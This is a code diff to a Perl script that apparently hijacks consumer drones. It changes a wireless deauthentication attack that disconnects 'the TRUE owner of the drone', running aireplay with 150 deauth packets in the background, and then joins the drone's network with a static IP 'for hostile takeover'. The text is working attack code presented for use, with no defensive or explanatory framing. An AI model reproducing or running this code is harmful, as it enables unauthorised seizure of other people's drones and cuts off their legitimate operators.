@@ -53,16 +53,22 @@ sleep(1);
 
 # now, disconnect the TRUE owner of the drone.
 print "Disconnecting the true owner of the drone ;)\n\n";
-sudo($aireplay, "-0", "3", "-a", $drone_mac, "-c", $client_mac, $interfaceMon);
-#sudo($aireplay, "-0", "3", "-a", $drone_mac, "wlan0mon");
-
+my $pid = open(DUMP, "|sudo $aireplay -0 150 -a $drone_mac -c $client_mac $interfaceMon >>/dev/null 2>>/dev/null") || die "Can't run airplay: $!";
+print "Running sudo $aireplay -0 150 -a $drone_mac -c $client_mac $interfaceMon on process $pid";
+#sudo($aireplay, "-0", "5", "-a", $drone_mac, "-c", $client_mac, $interfaceMon);
+#sudo($aireplay, "-0", "5", "-a", $drone_mac, $interfaceMon);
 
 print "\n\nConnecting to drone $drone_id ($drone_mac)\n";
 sudo($iwconfig, $interface, "essid", $drone_id);
 
 print "Acquiring IP from drone for hostile takeover\n";
-sudo($dhclient, "-v", $interface);
+#sudo($dhclient, "-v", $interface);
+sudo("ifconfig", $interface, "192.168.1.253");
 
+sudo("kill", $pid);
+#sudo("killall", "-9", $aireplay);
+
+#exit;
 
 sub sudo
 {
